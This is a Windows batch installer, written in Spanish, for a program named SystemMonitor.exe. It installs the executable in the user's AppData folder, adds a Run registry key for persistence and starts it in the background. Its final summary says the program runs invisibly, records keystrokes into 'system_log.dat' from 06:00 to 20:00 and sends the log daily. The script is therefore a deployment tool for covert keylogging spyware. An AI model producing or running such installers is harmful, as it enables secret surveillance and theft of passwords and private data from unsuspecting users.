@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul
color 0B

echo.
echo ╔════════════════════════════════════════════════════════╗
echo ║     INSTALADOR - MONITOR DE SISTEMA (Inicio Auto)     ║
echo ╚════════════════════════════════════════════════════════╝
echo.

REM ========================================
REM Detectar arquitectura del sistema
REM ========================================
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
    set "ARCH=64-bit"
) else if "%PROCESSOR_ARCHITECTURE%"=="x86" (
    if defined PROCESSOR_ARCHITEW6432 (
        set "ARCH=64-bit"
    ) else (
        set "ARCH=32-bit"
    )
) else (
    set "ARCH=64-bit"
)
echo 💻 Sistema detectado: Windows %ARCH%
echo.

REM Verificar permisos de administrador
net session >nul 2>&1
if errorlevel 1 (
    echo ⚠ ADVERTENCIA: Se recomienda ejecutar como Administrador
    echo.
    echo ¿Continuar de todas formas? (S/N^)
    set /p CONTINUAR=
    if /i not "!CONTINUAR!"=="S" exit /b 0
    echo.
)

REM ========================================
REM Verificar que existe el ejecutable
REM ========================================
echo [1/4] Verificando archivos...

set "EXE_PATH=%~dp0SystemMonitor.exe"

if not exist "%EXE_PATH%" (
    set "EXE_PATH=%~dp0dist\SystemMonitor.exe"
)

if not exist "%EXE_PATH%" (
    echo.
    echo ❌ ERROR: No se encuentra SystemMonitor.exe
    echo.
    echo Ubicaciones buscadas:
    echo    • %~dp0SystemMonitor.exe
    echo    • %~dp0dist\SystemMonitor.exe
    echo.
    echo Por favor ejecuta primero: instalar_y_compilar.bat
    echo.
    pause
    exit /b 1
)

echo    ✓ Ejecutable encontrado
for %%A in ("%EXE_PATH%") do set SIZE=%%~zA
set /a SIZE_MB=!SIZE! / 1048576
echo    📦 Tamaño: !SIZE_MB! MB
echo.

REM ========================================
REM Crear directorio de instalación
REM ========================================
echo [2/4] Preparando instalación...

set "INSTALL_DIR=%APPDATA%\SystemMonitor"

if exist "%INSTALL_DIR%" (
    echo    ⚠ Directorio existente, limpiando...
    taskkill /F /IM SystemMonitor.exe >nul 2>&1
    timeout /t 2 /nobreak >nul
    rmdir /S /Q "%INSTALL_DIR%" 2>nul
)

mkdir "%INSTALL_DIR%" 2>nul

echo    ✓ Directorio creado: %INSTALL_DIR%
echo.

REM ========================================
REM Copiar archivos
REM ========================================
echo [3/4] Copiando archivos...

copy /Y "%EXE_PATH%" "%INSTALL_DIR%\SystemMonitor.exe" >nul

if errorlevel 1 (
    echo.
    echo ❌ ERROR: No se pudo copiar el ejecutable
    echo.
    echo Posibles causas:
    echo    • El archivo está en uso
    echo    • Sin permisos de escritura
    echo    • Disco lleno
    echo.
    pause
    exit /b 1
)

echo    ✓ Ejecutable copiado
echo.

REM ========================================
REM Configurar inicio automático
REM ========================================
echo [4/4] Configurando inicio automático...

REM Eliminar entrada anterior si existe
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /f >nul 2>&1

REM Agregar nueva entrada
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "\"%INSTALL_DIR%\SystemMonitor.exe\"" /f >nul

if errorlevel 1 (
    echo    ⚠ No se pudo agregar al inicio automático
    echo    El programa funcionará pero deberás iniciarlo manualmente
    echo.
) else (
    echo    ✓ Inicio automático configurado
    echo.
)

REM ========================================
REM Iniciar el monitor
REM ========================================
echo Iniciando monitor en segundo plano...

start "" "%INSTALL_DIR%\SystemMonitor.exe"

REM Esperar un momento para que inicie
timeout /t 3 /nobreak >nul

REM Verificar que está corriendo
tasklist /FI "IMAGENAME eq SystemMonitor.exe" 2>NUL | find /I /N "SystemMonitor.exe">NUL
if "%ERRORLEVEL%"=="0" (
    echo    ✓ Monitor iniciado correctamente
) else (
    echo    ⚠ El monitor puede estar iniciándose...
)

echo.
echo ╔════════════════════════════════════════════════════════╗
echo ║              ✓ INSTALACIÓN COMPLETADA                 ║
echo ╚════════════════════════════════════════════════════════╝
echo.
echo 📍 Ubicación: %INSTALL_DIR%
echo.
echo ✅ ESTADO:
echo    • Monitor ejecutándose (invisible)
echo    • Inicio automático: ACTIVADO
echo    • Captura: 06:00 - 20:00
echo    • Envío diario: 20:00 (8 PM)
echo.
echo 📝 ARCHIVOS CREADOS:
echo    • SystemMonitor.exe      (programa)
echo    • system_log.dat         (registro de teclas)
echo    • config.dat             (configuración)
echo.
echo 🔍 VERIFICAR:
echo    • Administrador de tareas ^> Procesos ^> SystemMonitor.exe
echo    • Carpeta: %INSTALL_DIR%
echo.
echo 🗑️ DESINSTALAR:
echo    • Ejecuta: desinstalar.bat
echo.
pause